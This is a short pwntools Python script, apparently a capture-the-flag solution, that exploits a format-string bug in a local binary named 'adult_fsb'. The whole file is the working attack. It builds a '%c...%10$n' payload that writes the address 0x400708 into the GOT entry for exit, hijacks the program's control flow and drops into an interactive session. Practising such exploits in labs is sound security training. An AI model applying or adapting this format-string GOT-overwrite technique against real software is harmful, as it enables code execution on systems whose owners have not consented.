from pwn import *

p = process('./adult_fsb')
e = ELF("./adult_fsb")
l = e.libc

ret = 0x400708
payload = '%' +str(ret) +  'c'
payload += '%10$n' + 'a' * 2
payload += p64(e.got['exit'])

p.sendline(' ')
p.sendline(payload)

p.interactive()
